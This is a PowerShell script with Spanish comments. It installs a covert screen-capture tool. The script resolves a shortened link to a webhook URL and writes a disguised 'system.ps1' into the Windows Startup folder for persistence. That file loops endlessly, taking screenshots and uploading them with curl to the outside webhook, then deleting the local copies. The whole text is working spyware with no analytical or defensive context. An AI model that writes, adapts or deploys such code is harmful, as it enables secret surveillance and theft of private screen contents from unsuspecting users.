# Contenido del script
$hookurl = "https://bit.ly/Screen_dc"
$seconds = 30 # Intervalo entre capturas (en segundos)
$imagesToSend = 2 # Cantidad de imágenes a enviar

# Detección de URL acortada
if ($hookurl.Length -ne 121) {
    Write-Host "URL del webhook acortada detectada..." 
    $hookurl = (irm $hookurl).url
}

# Obtener la ruta de la carpeta de inicio del usuario
$StartupFolder = [Environment]::GetFolderPath("Startup")

# Ruta del script principal
$ScriptPath = Join-Path -Path $StartupFolder -ChildPath "system.ps1"

# Descargar el script en la carpeta de inicio
$ScriptContent = @"
while ($true) {
    for ($i=0; $i -lt $imagesToSend; $i++) {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        $Screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $Width = $Screen.Width
        $Height = $Screen.Height
        $Bitmap = New-Object System.Drawing.Bitmap $Width, $Height
        $Graphic = [System.Drawing.Graphics]::FromImage($Bitmap)
        $Graphic.CopyFromScreen(0, 0, 0, 0, $Bitmap.Size)
        $FilePath = "$env:temp\SC$i.png"
        $Bitmap.Save($FilePath, [System.Drawing.Imaging.ImageFormat]::Png)
        curl.exe -F "file1=@$FilePath" $hookurl
        Remove-Item -Path $FilePath
    }
    Start-Sleep $seconds
}
"@
$ScriptContent | Out-File -FilePath $ScriptPath -Encoding utf8

Write-Host "Script descargado y configurado para ejecutarse al iniciar Windows!!!"

